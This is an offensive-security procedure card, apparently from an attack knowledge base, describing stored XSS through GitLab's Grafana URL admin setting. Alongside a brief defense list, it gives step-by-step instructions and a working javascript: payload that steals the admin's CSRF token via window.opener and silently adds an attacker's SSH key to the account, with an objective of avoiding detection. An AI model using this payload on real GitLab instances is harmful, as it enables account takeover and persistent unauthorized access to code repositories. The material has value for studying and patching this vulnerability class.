---
id: proc-gitlab-inject-js-payload
tags:
  - xss
  - stored-xss
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/javascript-alert-opener-location]]'
  - '[[commands/javascript-csrf-theft-ssh-addition]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:15.940Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---

# Inject-JavaScript-Payload-into-Grafana-URL

## Summary

This procedure demonstrates injecting a javascript: payload into the GitLab Grafana domain URL field, exploiting the lack of protocol validation to store malicious code that renders as an executable link.

## Description

The Grafana URL input in GitLab's admin settings stores user input without sanitizing schemes, allowing javascript: URIs. When saved, the payload is persisted in the database (PostgreSQL) and rendered in the admin sidebar. This enables stored XSS, where clicking the link in another session executes the JS, accessing the original tab via window.opener due to target='_blank'.

## Requirements

1. Administrative access to GitLab settings (from previous procedure)
2. Knowledge of target CSRF structure (meta[name=csrf-token])
3. Attacker's SSH public key for advanced payload

## Defense

Defensive measures and detection strategies:

- Validate and whitelist allowed protocols (e.g., http/https only) in URL inputs
- Sanitize stored URLs with libraries like Rails' url_for or DOMPurify
- Audit logs for unusual URL saves in admin settings

## Objectives

1. Store a basic payload to confirm XSS
2. Deploy an advanced payload for CSRF exploitation and persistence
3. Ensure payload executes without immediate detection

## Instructions

### Step 1: Enter Basic Test Payload

**Context**: Use a simple alert to verify storage and execution potential.

**Command** ([[commands/javascript-alert-opener-location]]):
```javascript
javascript:alert(window.opener.document.location)
```

> This payload alerts the original tab's URL when executed, confirming window.opener access. Enter it in the Grafana domain URL field and save.

**Expected Output**: Settings saved; no errors.

### Step 2: Deploy Advanced Exploitation Payload

**Context**: Extract CSRF and perform unauthorized action like adding an SSH key.

**Command** ([[commands/javascript-csrf-theft-ssh-addition]]):
```javascript
javascript:var csrf = window.opener.$('meta[name=csrf-token]').attr('content'); window.opener.$.post('/profile/keys', { 'authenticity_token': csrf, 'key[key]': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUXhvMZ/BFqgVY4iWWv2lrs2alZHA6CoNcnZWH7gxObXGeFK89/itFbI8NrEDE291LRScBL1nuHs0xlf7uidf97uFGVMyIW8TKeaG/j5q6olr9ejiOZhiiGGkQZf1iSTV4VYN77EtG7iV62VB1ZbwnCau1xT5mlXbd8E4WzaHIxuOY8Ao8EozouaQzWt+I1xJx5rufVwItmTaX5QKV5Cuv8GhMRUb1UqujNKr22/rbWnut0pSzB1+uE4S4E1AaCNX9Byy0z65nzupk5kdj8y/qJ3pk8UBOgQtJCFEOwc42EHS3JwTeMRNRXs9bwqRJfXUomXL1LZ5Eua7UX7aQq7pf admin@foo.com', 'key[title]': 'admin@foo.com' });
```

> This extracts the CSRF token using jQuery and posts it to /profile/keys with the attacker's SSH key. Save the settings.

**Expected Output**: Payload stored; verifiable by checking the field post-save.

**Success Indicators**:
- Payload persists after page reload
- No sanitization warnings

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/javascript-alert-opener-location]]
- [[commands/javascript-csrf-theft-ssh-addition]]

## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[javascript-injection]]

---
